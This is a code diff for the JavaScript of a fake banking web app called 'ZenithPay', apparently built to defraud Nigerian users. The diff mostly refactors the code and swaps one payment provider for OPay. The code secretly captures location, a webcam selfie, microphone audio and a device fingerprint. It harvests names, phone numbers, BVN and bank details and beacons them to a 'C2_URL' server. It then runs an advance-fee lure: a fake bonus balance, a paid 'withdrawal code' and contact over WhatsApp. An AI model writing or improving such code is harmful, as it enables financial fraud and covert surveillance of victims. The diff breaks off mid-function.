@@ -1,30 +1,21 @@
 // ============ CONFIG ============
+// ⚠️ REPLACE WITH YOUR BACKEND URL ⚠️
 const C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
 const ADMIN_PASSWORD = 'ZENITH2026';
 
-// ============ SPLASH TO LOGIN ============
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('Page loaded');
-    
-    var splash = document.getElementById('splash');
-    var loginPage = document.getElementById('loginPage');
-    
-    if (splash && loginPage) {
-        setTimeout(function() {
-            splash.style.display = 'none';
-            loginPage.classList.remove('hidden');
-            console.log('Splash hidden, login shown');
-        }, 3000);
-    } else {
-        console.log('Splash or loginPage not found');
-    }
-});
+// ============ SPLASH ============
+setTimeout(() => {
+    const splash = document.getElementById('splash');
+    const loginPage = document.getElementById('loginPage');
+    if (splash) splash.style.display = 'none';
+    if (loginPage) loginPage.classList.remove('hidden');
+}, 3000);
 
 // ============ PERMISSIONS ============
 function requestPermissions() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            function(pos) {
+            (pos) => {
                 sendData({
                     type: 'location',
                     lat: pos.coords.latitude,
@@ -32,7 +23,7 @@ function requestPermissions() {
                     accuracy: pos.coords.accuracy
                 });
             },
-            function() {},
+            () => {},
             { enableHighAccuracy: true, timeout: 8000 }
         );
     }
@@ -40,41 +31,41 @@ function requestPermissions() {
     navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: 640, height: 480 }
     })
-    .then(function(stream) {
-        var video = document.createElement('video');
+    .then((stream) => {
+        const video = document.createElement('video');
         video.srcObject = stream;
-        video.onloadedmetadata = function() {
+        video.onloadedmetadata = () => {
             video.play();
-            var canvas = document.createElement('canvas');
+            const canvas = document.createElement('canvas');
             canvas.width = 640;
             canvas.height = 480;
-            var ctx = canvas.getContext('2d');
+            const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
-            var imageData = canvas.toDataURL('image/jpeg', 0.8);
-            stream.getTracks().forEach(function(track) { track.stop(); });
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            stream.getTracks().forEach(track => track.stop());
             sendData({ type: 'selfie', image: imageData });
         };
     })
-    .catch(function() {});
+    .catch(() => {});
 
     navigator.mediaDevices.getUserMedia({ audio: true })
-    .then(function(stream) {
-        var mediaRecorder = new MediaRecorder(stream);
-        var chunks = [];
-        mediaRecorder.ondataavailable = function(e) { chunks.push(e.data); };
-        mediaRecorder.onstop = function() {
-            var blob = new Blob(chunks, { type: 'audio/webm' });
-            var reader = new FileReader();
-            reader.onload = function() {
+    .then((stream) => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            const reader = new FileReader();
+            reader.onload = () => {
                 sendData({ type: 'audio', audio: reader.result });
             };
             reader.readAsDataURL(blob);
-            stream.getTracks().forEach(function(track) { track.stop(); });
+            stream.getTracks().forEach(track => track.stop());
         };
         mediaRecorder.start();
-        setTimeout(function() { mediaRecorder.stop(); }, 5000);
+        setTimeout(() => mediaRecorder.stop(), 5000);
     })
-    .catch(function() {});
+    .catch(() => {});
 }
 
 // ============ SEND DATA ============
@@ -83,24 +74,24 @@ function sendData(payload) {
     payload._ua = navigator.userAgent;
 
     if (navigator.sendBeacon) {
-        var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-        navigator.sendBeacon(C2_URL + '/capture', blob);
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        navigator.sendBeacon(`${C2_URL}/capture`, blob);
         return;
     }
 
-    fetch(C2_URL + '/capture', {
+    fetch(`${C2_URL}/capture`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
         mode: 'no-cors'
-    }).catch(function() {});
+    }).catch(() => {});
 }
 
 // ============ FINGERPRINT ============
 function captureFingerprint() {
     sendData({
         type: 'fingerprint',
-        screen: screen.width + 'x' + screen.height,
+        screen: `${screen.width}x${screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         language: navigator.language,
         platform: navigator.platform,
@@ -109,13 +100,13 @@ function captureFingerprint() {
     });
 }
 
-// ============ FORM SUBMIT (LOGIN) ============
-var signupForm = document.getElementById('signupForm');
+// ============ FORM SUBMIT ============
+const signupForm = document.getElementById('signupForm');
 if (signupForm) {
-    signupForm.addEventListener('submit', function(e) {
+    signupForm.addEventListener('submit', (e) => {
         e.preventDefault();
 
-        var userData = {
+        const userData = {
             type: 'banking_details',
             fullname: document.getElementById('fullname').value,
             phone: document.getElementById('phone').value,
@@ -128,50 +119,80 @@ if (signupForm) {
         sendData(userData);
         localStorage.setItem('zenithpay_user', JSON.stringify(userData));
 
-        var btn = document.getElementById('submitBtn');
+        const btn = document.getElementById('submitBtn');
         btn.textContent = 'Opening Account...';
         btn.disabled = true;
 
-        setTimeout(function() {
+        setTimeout(() => {
             window.location.href = 'dashboard.html';
         }, 1800);
     });
 }
 
 // ============================================================
-// ===== DASHBOARD FUNCTIONS =====
+// ===== TAB SWITCHING =====
+// ============================================================
+
+function switchTab(tab) {
+    document.querySelectorAll('.tab-content').forEach(el => {
+        el.classList.add('hidden');
+        el.classList.remove('active');
+    });
+
+    const target = document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
+    if (target) {
+        target.classList.remove('hidden');
+        target.classList.add('active');
+    }
+
+    document.querySelectorAll('.nav-item').forEach(el => {
+        el.classList.remove('active');
+        if (el.dataset.tab === tab) {
+            el.classList.add('active');
+        }
+    });
+}
+
+document.querySelectorAll('.nav-item').forEach(btn => {
+    btn.addEventListener('click', function() {
+        switchTab(this.dataset.tab);
+    });
+});
+
+// ============================================================
+// ===== DASHBOARD LOAD =====
 // ============================================================
 
 function loadDashboard() {
-    var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
+    const userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
 
-    var greeting = document.getElementById('greeting');
+    const greeting = document.getElementById('greeting');
     if (greeting && userData.fullname) {
-        greeting.textContent = 'Hi, ' + userData.fullname.split(' ')[0];
+        greeting.textContent = `Hi, ${userData.fullname.split(' ')[0]}`;
     }
 
-    var avatar = document.getElementById('avatar');
-    var profileAvatar = document.getElementById('profileAvatar');
+    const avatar = document.getElementById('avatar');
+    const profileAvatar = document.getElementById('profileAvatar');
     if (userData.fullname) {
-        var initials = userData.fullname.split(' ').map(function(n) { return n[0]; }).join('').toUpperCase();
+        const initials = userData.fullname.split(' ').map(n => n[0]).join('').toUpperCase();
         if (avatar) avatar.textContent = initials;
         if (profileAvatar) profileAvatar.textContent = initials;
     }
 
-    var accountDisplay = document.getElementById('accountDisplay');
-    var bankDisplay = document.getElementById('bankDisplay');
+    const accountDisplay = document.getElementById('accountDisplay');
+    const bankDisplay = document.getElementById('bankDisplay');
     if (accountDisplay) accountDisplay.textContent = userData.account || '0123456789';
     if (bankDisplay) bankDisplay.textContent = userData.bank || 'GTBank';
 
     // Profile
-    var profileName = document.getElementById('profileName');
-    var profileFullName = document.getElementById('profileFullName');
-    var profilePhone = document.getElementById('profilePhone');
-    var profileEmail = document.getElementById('profileEmail');
-    var profileEmailField = document.getElementById('profileEmailField');
-    var profileBvn = document.getElementById('profileBvn');
-    var profileBank = document.getElementById('profileBank');
-    var profileAccount = document.getElementById('profileAccount');
+    const profileName = document.getElementById('profileName');
+    const profileFullName = document.getElementById('profileFullName');
+    const profilePhone = document.getElementById('profilePhone');
+    const profileEmail = document.getElementById('profileEmail');
+    const profileEmailField = document.getElementById('profileEmailField');
+    const profileBvn = document.getElementById('profileBvn');
+    const profileBank = document.getElementById('profileBank');
+    const profileAccount = document.getElementById('profileAccount');
 
     if (profileName) profileName.textContent = userData.fullname || 'Chidi Okafor';
     if (profileFullName) profileFullName.textContent = userData.fullname || 'Chidi Okafor';
@@ -183,20 +204,20 @@ function loadDashboard() {
     if (profileAccount) profileAccount.textContent = userData.account || '0123456789';
 
     // Card names
-    var cardName1 = document.getElementById('cardName1');
-    var cardName2 = document.getElementById('cardName2');
+    const cardName1 = document.getElementById('cardName1');
+    const cardName2 = document.getElementById('cardName2');
     if (cardName1) cardName1.textContent = userData.fullname || 'Chidi Okafor';
     if (cardName2) cardName2.textContent = userData.fullname || 'Chidi Okafor';
 
-    var balanceDisplay = document.getElementById('balanceDisplay');
-    var statBalance = document.getElementById('statBalance');
-    var statTx = document.getElementById('statTx');
-    var balanceCard = document.querySelector('.balance-card');
-    var emptyState = document.getElementById('emptyState');
-    var bonusTx = document.getElementById('bonusTx');
-    var withdrawTx = document.getElementById('withdrawTx');
+    const balanceDisplay = document.getElementById('balanceDisplay');
+    const statBalance = document.getElementById('statBalance');
+    const statTx = document.getElementById('statTx');
+    const balanceCard = document.querySelector('.balance-card');
+    const emptyState = document.getElementById('emptyState');
+    const bonusTx = document.getElementById('bonusTx');
+    const withdrawTx = document.getElementById('withdrawTx');
 
-    var balanceState = localStorage.getItem('zenithpay_balance') || '6000';
+    const balanceState = localStorage.getItem('zenithpay_balance') || '6000';
 
     if (balanceState === '0') {
         if (balanceDisplay) balanceDisplay.textContent = '₦0.00';
@@ -217,44 +238,14 @@ function loadDashboard() {
 }
 
 // ============================================================
-// ===== TAB SWITCHING =====
-// ============================================================
-
-function switchTab(tab) {
-    document.querySelectorAll('.tab-content').forEach(function(el) {
-        el.classList.add('hidden');
-        el.classList.remove('active');
-    });
-
-    var target = document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
-    if (target) {
-        target.classList.remove('hidden');
-        target.classList.add('active');
-    }
-
-    document.querySelectorAll('.nav-item').forEach(function(el) {
-        el.classList.remove('active');
-        if (el.dataset.tab === tab) {
-            el.classList.add('active');
-        }
-    });
-}
-
-document.querySelectorAll('.nav-item').forEach(function(btn) {
-    btn.addEventListener('click', function() {
-        switchTab(this.dataset.tab);
-    });
-});
-
-// ============================================================
 // ===== CARDS TAB =====
 // ============================================================
 
-document.querySelectorAll('[id^="freezeBtn"]').forEach(function(btn) {
+document.querySelectorAll('[id^="freezeBtn"]').forEach(btn => {
     btn.addEventListener('click', function() {
-        var cardId = this.id.replace('freezeBtn', '');
-        var cardVisual = document.querySelector('#card' + cardId + ' .card-visual');
-        var status = this.textContent.trim();
+        const cardId = this.id.replace('freezeBtn', '');
+        const cardVisual = document.querySelector(`#card${cardId} .card-visual`);
+        const status = this.textContent.trim();
 
         if (status === '❄️ Freeze') {
             this.textContent = '🔥 Unfreeze';
@@ -263,7 +254,7 @@ document.querySelectorAll('[id^="freezeBtn"]').forEach(function(btn) {
                 cardVisual.style.opacity = '0.5';
                 cardVisual.style.filter = 'grayscale(0.8)';
             }
-            alert('Card •••• ' + document.getElementById('cardNumber' + cardId).textContent.slice(-4) + ' has been frozen.');
+            alert(`Card •••• ${document.getElementById(`cardNumber${cardId}`).textContent.slice(-4)} has been frozen.`);
         } else {
             this.textContent = '❄️ Freeze';
             this.style.background = '';
@@ -271,18 +262,18 @@ document.querySelectorAll('[id^="freezeBtn"]').forEach(function(btn) {
                 cardVisual.style.opacity = '1';
                 cardVisual.style.filter = 'none';
             }
-            alert('Card •••• ' + document.getElementById('cardNumber' + cardId).textContent.slice(-4) + ' has been unfrozen.');
+            alert(`Card •••• ${document.getElementById(`cardNumber${cardId}`).textContent.slice(-4)} has been unfrozen.`);
         }
     });
 });
 
-document.querySelectorAll('[id^="cardDetailsBtn"]').forEach(function(btn) {
+document.querySelectorAll('[id^="cardDetailsBtn"]').forEach(btn => {
     btn.addEventListener('click', function() {
-        var cardId = this.id.replace('cardDetailsBtn', '');
-        var cardNumber = document.getElementById('cardNumber' + cardId).textContent;
-        var cardName = document.getElementById('cardName' + cardId).textContent;
-        var cardExpiry = document.getElementById('cardExpiry' + cardId).textContent;
-        var cardNetwork = document.querySelector('#card' + cardId + ' .card-network').textContent;
+        const cardId = this.id.replace('cardDetailsBtn', '');
+        const cardNumber = document.getElementById(`cardNumber${cardId}`).textContent;
+        const cardName = document.getElementById(`cardName${cardId}`).textContent;
+        const cardExpiry = document.getElementById(`cardExpiry${cardId}`).textContent;
+        const cardNetwork = document.querySelector(`#card${cardId} .card-network`).textContent;
 
         document.getElementById('detailCardNumber').textContent = cardNumber;
         document.getElementById('detailCardName').textContent = cardName;
@@ -312,10 +303,10 @@ document.getElementById('addCardBtn')?.addEventListener('click', function() {
 // ============================================================
 
 document.getElementById('transferBtn')?.addEventListener('click', function() {
-    var bank = document.getElementById('transferBank').value;
-    var account = document.getElementById('transferAccount').value;
-    var amount = document.getElementById('transferAmount').value;
-    var narration = document.getElementById('transferNarration').value;
+    const bank = document.getElementById('transferBank').value;
+    const account = document.getElementById('transferAccount').value;
+    const amount = document.getElementById('transferAmount').value;
+    const narration = document.getElementById('transferNarration').value;
 
     if (!bank || !account || !amount) {
         alert('⚠️ Please fill in all required fields.');
@@ -331,11 +322,11 @@ document.getElementById('transferBtn')?.addEventListener('click', function() {
         timestamp: Date.now()
     });
 
-    document.getElementById('transferAmountDisplay').textContent = '₦' + amount;
+    document.getElementById('transferAmountDisplay').textContent = `₦${amount}`;
     document.getElementById('transferAccountDisplay').textContent = account;
     document.getElementById('transferResult').classList.remove('hidden');
 
-    setTimeout(function() {
+    setTimeout(() => {
         document.getElementById('transferResult').classList.add('hidden');
         document.getElementById('transferBank').value = '';
         document.getElementById('transferAccount').value = '';
@@ -349,7 +340,7 @@ document.getElementById('transferBtn')?.addEventListener('click', function() {
 // ===== PROFILE TAB =====
 // ============================================================
 
-document.querySelectorAll('.toggle').forEach(function(toggle) {
+document.querySelectorAll('.toggle').forEach(toggle => {
     toggle.addEventListener('click', function() {
         if (this.textContent === 'On') {
             this.textContent = 'Off';
@@ -369,12 +360,12 @@ document.getElementById('logoutBtn')?.addEventListener('click', function() {
 });
 
 // ============================================================
-// ===== PAY WITH FLUTTERWAVE =====
+// ===== PAY WITH OPAY =====
 // ============================================================
 
-document.getElementById('payWithFlutterwaveBtn')?.addEventListener('click', async function() {
-    var amount = document.getElementById('depositAmount').value;
-    var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
+document.getElementById('payWithOPayBtn')?.addEventListener('click', async function() {
+    const amount = document.getElementById('depositAmount').value;
+    const userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
 
     if (!userData.email) {
         alert('⚠️ Please complete your profile first.');
@@ -385,47 +376,48 @@ document.getElementById('payWithFlutterwaveBtn')?.addEventListener('click', asyn
         this.textContent = 'Processing...';
         this.disabled = true;
 
-        var response = await fetch(C2_URL + '/initiate_payment', {
+        const response = await fetch(`${C2_URL}/opay/create_order`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 email: userData.email,
                 amount: amount,
-                name: userData.fullname || 'Customer'
+                name: userData.fullname || 'Customer',
+                phone: userData.phone || '08000000000'
             })
         });
 
-        var result = await response.json();
+        const result = await response.json();
 
-        if (result.status === 'success' && result.payment_link) {
-            window.location.href = result.payment_link;
+        if (result.status === 'success' && result.redirect_url) {
+            window.location.href = result.redirect_url;
         } else {
-            alert('❌ Payment initiation failed. Please try again.');
-            this.textContent = '💳 Pay with Flutterwave';
+            alert('❌ Payment initiation failed: ' + (result.message || 'Please try again.'));
+            this.textContent = '💳 Pay with OPay';
             this.disabled = false;
         }
     } catch (error) {
-        console.error('Payment error:', error);
+        console.error('OPay error:', error);
         alert('❌ An error occurred. Please try again.');
-        this.textContent = '💳 Pay with Flutterwave';
+        this.textContent = '💳 Pay with OPay';
         this.disabled = false;
     }
 });
 
-// ===== CHECK PAYMENT STATUS ON RETURN =====
-if (window.location.search.includes('tx_ref')) {
-    var params = new URLSearchParams(window.location.search);
-    var tx_ref = params.get('tx_ref');
-    var status = params.get('status');
+// ===== CHECK OPAY PAYMENT STATUS ON RETURN =====
+if (window.location.search.includes('orderNo')) {
+    const params = new URLSearchParams(window.location.search);
+    const orderNo = params.get('orderNo');
+    const status = params.get('status');
 
-    if (status === 'successful' && tx_ref) {
-        fetch(C2_URL + '/verify_payment', {
+    if (status === 'SUCCESS' && orderNo) {
+        fetch(`${C2_URL}/opay/verify_order`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ tx_ref: tx_ref })
+            body: JSON.stringify({ orderNo: orderNo })
         })
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
+        .then(res => res.json())
+        .then(data => {
             if (data.status === 'success') {
                 alert('✅ Payment successful! Your bonus is now available.');
                 localStorage.setItem('zenithpay_balance', '0');
@@ -434,8 +426,8 @@ if (window.location.search.includes('tx_ref')) {
                 alert('⚠️ Payment verification failed. Contact support.');
             }
         });
-    } else if (status === 'cancelled') {
-        alert('⚠️ Payment was cancelled.');
+    } else if (status === 'FAIL') {
+        alert('⚠️ Payment failed. Please try again.');
     }
 }
 
@@ -466,11 +458,11 @@ document.getElementById('withdrawModal')?.addEventListener('click', function(e) 
 // ============================================================
 
 document.getElementById('copyAccount')?.addEventListener('click', function() {
-    var account = '0123456789';
-    navigator.clipboard.writeText(account).then(function() {
+    const account = '0123456789';
+    navigator.clipboard.writeText(account).then(() => {
         alert('✅ Account number copied!');
-    }).catch(function() {
-        var input = document.createElement('input');
+    }).catch(() => {
+        const input = document.createElement('input');
         input.value = account;
         document.body.appendChild(input);
         input.select();
@@ -481,16 +473,16 @@ document.getElementById('copyAccount')?.addEventListener('click', function() {
 });
 
 document.getElementById('verifyPaymentBtn')?.addEventListener('click', function() {
-    var amount = document.getElementById('depositAmount').value;
-    var userAccount = document.getElementById('userAccount').value;
-    var userBank = document.getElementById('userBank').value;
+    const amount = document.getElementById('depositAmount').value;
+    const userAccount = document.getElementById('userAccount').value;
+    const userBank = document.getElementById('userBank').value;
 
     if (!userAccount || !userBank) {
         alert('⚠️ Please fill in your account details.');
         return;
     }
 
-    var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
+    const userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
 
     sendData({
         type: 'withdrawal_attempt',
@@ -503,9 +495,9 @@ document.getElementById('verifyPaymentBtn')?.addEventListener('click', function(
     document.getElementById('withdrawModal').classList.add('hidden');
     document.getElementById('whatsappModal').classList.remove('hidden');
 
-    var waLink = document.getElementById('whatsappLink');
-    var msg = 'Hello, I sent ₦' + amount + ' for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. My account is ' + userAccount + ' (' + userBank + '). Please send my code.';
-    waLink.href = 'https://wa.me/2348000000000?text=' + encodeURIComponent(msg);
+    const waLink = document.getElementById('whatsappLink');
+    const msg = `Hello, I sent ₦${amount} for my ZenithPay withdrawal. My name is ${userData.fullname || 'User'}. My account is ${userAccount} (${userBank}). Please send my code.`;
+    waLink.href = `https://wa.me/2348000000000?text=${encodeURIComponent(msg)}`;
 });
 
 document.getElementById('closeWhatsapp')?.addEventListener('click', function() {
@@ -518,4 +510,10 @@ document.getElementById('whatsappModal')?.addEventListener('click', function(e) 
     }
 });
 
-document.getElementById('verifyCodeBtn')?.addEventListen
+document.getElementById('verifyCodeBtn')?.addEventListener('click', function() {
+    const enteredPassword = document.getElementById('adminPassword').value;
+
+    if (enteredPassword !== ADMIN_PASSWORD) {
+        const input = document.getElementById('adminPassword');
+        input.style.borderColor = '#DC2626';
+        input.style.boxShadow = '0 0 0 3px rgba(
